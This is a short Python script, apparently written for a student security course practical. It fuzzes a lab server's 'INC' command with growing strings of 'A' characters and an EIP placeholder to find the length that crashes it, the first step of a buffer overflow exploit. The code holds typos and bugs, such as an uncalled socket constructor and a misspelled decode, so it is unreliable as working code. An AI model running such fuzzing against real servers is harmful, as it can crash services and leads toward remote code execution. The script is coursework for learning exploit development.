#Python Client fuzzer for CSEC201 Final Practical
#NAME: Griffin Pundt

import socket

ip = "192.169.204.33"       #IP of windows server
port = 2221                 #port server is running on
EIP = "BBBB"



#create connection to server
sock = socket.socket
sock.connect((ip, port))
print(sock.recv(1024).decode())     #recieve server's welcome message

#send first string to test if it works
start_str = "INC 123456"
try:
    sock.send(start_str.encode())
    print(sock.recv(1024).decpde())
except:
    print("Initial send Failed...")

#commence fuzzing
for length in range(1, 50):
    try:
        bad_str = "INC " + "A"*length + EIP
        sock.send(bad_str.encode())
        print(f"RESPONSE to bad_str with length{length}: ")
        print(sock.recv(1024).decode())
    except:
        print(f"Server broke with length {length}\n")